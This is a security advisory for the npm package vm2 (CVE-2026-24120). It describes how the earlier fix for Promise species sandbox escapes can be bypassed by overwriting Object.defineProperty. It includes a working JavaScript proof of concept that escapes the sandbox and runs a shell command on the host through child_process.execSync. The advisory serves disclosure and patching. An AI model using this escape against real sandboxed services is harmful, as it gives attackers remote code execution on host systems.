# [C] VM2 Has Sandbox Breakout Through Promise Species

## Summary
Severity: Critical
Advisory: GHSA-qvjj-29qf-hp7p
CVE: CVE-2026-24120
CWE: CWE-693, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-qvjj-29qf-hp7p
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.10.5

## Details
### Summary

The fix for https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5 is insufficient and can be circumvented allowing attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The fix for https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5 introduced the function `resetPromiseSpecies` https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/setup-sandbox.js#L35C7-L39.
This function changes the `species` property of promise objects back to a known value. However, it uses the function `[].includes` and `Object.defineProperty` which can be overewritten to prevent the species from being changed.

### PoC

The following code demonstrates this issue by aquiring the host process object and executing `touch pwned`.

```js
const {VM} = require("vm2");
const vm = new VM();
vm.run(`
Object.defineProperty=()=>{};
async function fn() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();
`);
```

### Impact

Attackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5
- https://github.com/patriksimek/vm2/security/advisories/GHSA-qvjj-29qf-hp7p
- https://nvd.nist.gov/vuln/detail/CVE-2026-24120
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.10.5
